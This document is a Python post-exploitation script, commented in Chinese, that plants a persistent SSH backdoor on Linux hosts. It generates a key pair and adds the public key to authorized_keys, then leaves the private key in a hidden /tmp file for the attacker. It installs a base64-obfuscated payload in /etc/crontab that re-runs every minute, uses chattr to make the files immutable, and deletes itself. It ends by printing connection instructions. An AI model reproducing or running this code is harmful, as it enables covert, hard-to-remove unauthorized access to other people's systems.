# coding=utf-8
# !/usr/bin/env python
from __future__ import print_function
import subprocess
import sys, os, base64


def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def etc_crontab(file_path, shell,user):
    py = check_py()
    with open(file_path, 'w') as file:
        file.write(shell)
    command = 'echo "*/1 * * * * '+ user + '  python' + py + ' ' + file_path + '" | sudo tee -a /etc/crontab'
    ml(command)
    command = 'cat /etc/crontab'
    j = ml(command)
    if '*/1 * * * *' in j:
        print("Yes----crontab&sshkey密钥写入成功")
    else:
        print("No----crontab&sshkey密钥写入失败")


def miyue(new_content):
    filename = "/etc/ssh/sshd_config"
    with open(filename, 'a') as file:
        file.write(new_content + '\n')


def delete_current_script():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("当前脚本文件已成功删除" + script_path)
    except Exception as e:
        print("无法删除当前脚本文件：", e)


def check_py():
    if sys.version_info.major == 3:
        print("当前运行的是 Python 3 版本。")
        ret = '3'
    elif sys.version_info.major == 2:
        print("当前运行的是 Python 2 版本。")
        ret = '2'
    else:
        print("未知的 Python 版本。")
        ret = ' '
    return ret


def base64_encode(input_string):
    if isinstance(input_string, str):
        input_bytes = input_string.encode('utf-8', 'ignore')
    else:
        input_bytes = input_string
    encoded_bytes = base64.b64encode(input_bytes)
    encoded_string = encoded_bytes.decode('utf-8')
    return encoded_string


if __name__ == '__main__':
    keydir = '/tmp/.a'
    file_path = "/tmp/.11"
    password = "admin!@#45123"
    user = ml('whoami').strip()
    try:
        miyue("HostKey /etc/ssh/ssh_host_ed25519_key")
        miyue("PubkeyAuthentication yes")
        miyue("AuthorizedKeysFile .ssh/authorized_keys")
    except Exception as e:
        print('低权限用户配置文件写入失败，有的低权限用户不影响使用')
    shell1 = """# !/usr/bin/env python
import subprocess


def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()

    stdout, stderr = process.communicate()
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def miyue(new_content):
    filename = "/etc/ssh/sshd_config"
    with open(filename, 'a') as file:
        file.write(new_content + '\\n')
def lis(user):
    ml('chattr -i /etc/crontab')
    if 'root' in user:
        ml('chattr -i /root/.ssh')
        ml('chattr -i /root/.ssh/authorized_keys')
    else:
        ml('chattr -i /home/' + user + '/.ssh')
        ml('chattr -i /home/' + user + '/.ssh/authorized_keys')
def generate_ssh_key(password, user):
    if 'root' in user:
        command = 'ssh-keygen -t ed25519 -N "' + password + '" -q -f /' + user + '/.ssh/id_ed25519'
    else:
        command = 'ssh-keygen -t ed25519 -N "' + password + '" -q -f /home/' + user + '/.ssh/id_ed25519'
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = p.communicate()
if __name__ == '__main__':
    a = ml('cat /etc/ssh/sshd_config')
    try:
        if not 'HostKey /etc/ssh/ssh_host_ed25519_key' in a:
            miyue("HostKey /etc/ssh/ssh_host_ed25519_key")
        elif not 'PubkeyAuthentication yes' in a:
            miyue("PubkeyAuthentication yes")
        elif not 'AuthorizedKeysFile .ssh/authorized_keys' in a:
            miyue("AuthorizedKeysFile .ssh/authorized_keys")
    except  Exception as e:
        pass
    user = ml('whoami').strip()
    password = '"""+password+"""'
    keydir = '"""+keydir+"""'
    spool_cor = ml('lsattr /etc/crontab').strip()[:16]
    if 'root' in user:
        sshdir = ml('lsattr -d /'+user+'/.ssh/').strip()[:16]
        sshedkey = ml('cat /'+user+'/.ssh/authorized_keys')
        sshdirau = ml('lsattr /'+user+'/.ssh/authorized_keys').strip()[:16]
        if (not os.path.exists('/' + user + '/.ssh/authorized_keys') or
        not os.path.exists(keydir) or
        (not 'i' in  sshdir) or
        (not 'i' in  sshdirau) or
        (not 'i' in  spool_cor) or
        ('ssh-ed25519' not in sshedkey and sshedkey not in user)):
            try:
                ml('rm -rf ' + keydir)
            except Exception as e:
                pass
            try:
                lis(user)
                ml('rm -rf ' + '/'+user+'/.ssh')
            except Exception as e:
                pass
            generate_ssh_key(password, user)
            ml('cat /' + user + '/.ssh/id_ed25519.pub >> /' + user + '/.ssh/authorized_keys && chmod 600 /' + user + '/.ssh/authorized_keys && chmod 700 /' + user + '/.ssh/')
            ml('cp /' + user + '/.ssh/id_ed25519  ' + keydir)
            ml('rm -rf /' + user + '/.ssh/id_ed25519 && rm -rf /' + user + '/.ssh/id_ed25519.pub')
            ml('chattr +i /' + user + '/.ssh && chattr +i /'+ user +'/.ssh/authorized_keys && chattr +i /etc/crontab')
    else:
        sshdir = ml('lsattr -d /home/'+user+'/.ssh/').strip()[:16]
        sshedkey = ml('cat /home/' + user + '/.ssh/authorized_keys')
        sshdirau = ml('lsattr /home/'+user+'/.ssh/authorized_keys').strip()[:16]      
        if (not os.path.exists('/home/' + user + '/.ssh/authorized_keys') or
        not os.path.exists(keydir) or
        (not 'i' in  sshdir) or
        (not 'i' in  spool_cor) or
        (not 'i' in  sshdirau) or       
        ('ssh-ed25519' not in sshedkey and sshedkey not in user)):
            try:
                ml('rm -rf ' + keydir)
            except Exception as e:
                pass
            try:
                lis(user)
                ml('rm -rf ' + '/home/'+user+'/.ssh')
            except Exception as e:
                pass
            ml('cat /home/' + user + '/.ssh/id_ed25519.pub >>  /home/' + user + '/.ssh/authorized_keys && chmod 600  /home/' + user + '/.ssh/authorized_keys && chmod 700  /home/' + user + '/.ssh/')
            ml('cp  /home/' + user + '/.ssh/id_ed25519  ' + keydir)
            ml('rm -rf  /home/' + user + '/.ssh/id_ed25519 && rm -rf  /home/' + user + '/.ssh/id_ed25519.pub')
            ml('chattr +i  /home/' + user + '/.ssh && chattr +i /home/' + user + ' /.ssh/authorized_keys && chattr +i /etc/crontab')
    """
    encoded_string = base64_encode(shell1)
    shell = """# !/usr/bin/env python
import subprocess
import base64
import os
encoded_string='""" + str(encoded_string) + """'
def base64_decode(encoded_string):
    decoded_bytes = base64.b64decode(encoded_string)
    return decoded_bytes
def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  
    stdout, stderr = process.communicate()  
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout
def run_code(decoded_bytes):
    try:
        decoded_string = decoded_bytes.decode('utf-8')
        exec(decoded_string)
    except Exception as e:
        exec(decoded_bytes)
decoded_bytes = base64_decode(encoded_string)
run_code(decoded_bytes)
    """
    etc_crontab(file_path, shell,user)
    command = 'chmod + x ' + file_path
    ml(command)
    exec(shell)
    ml('chattr +i ' + file_path)
    ml('chattr +i /etc/crontab')
    if 'root' in user:
        if user in ml('cat /root/.ssh/authorized_keys') and 'ssh-ed25519' in ml('cat /root/.ssh/authorized_keys'):
            print('密钥写入成功')
            print('----->利用成功,生成的用户为:', ml('whoami').strip(), '<-----')
            print('----->连接命令: ssh -i 密钥文件 ' + str(ml('whoami').strip()) + '@ip <-----')
            print('请下载{' + keydir + '}密钥文件连接')
    else:
        if user in ml('cat /home/'+user+'/.ssh/authorized_keys') and 'ssh-ed25519' in ml('cat /home/'+user+'/.ssh/authorized_keys'):
            print('----->利用成功,生成的用户为:', ml('whoami').strip(), '<-----')
            print('----->连接命令: ssh -i 密钥文件 ' + str(ml('whoami').strip()) + '@ip <-----')
            print('请下载{' + keydir + '}密钥文件连接')
    delete_current_script()  # 删除当前执行脚本文件
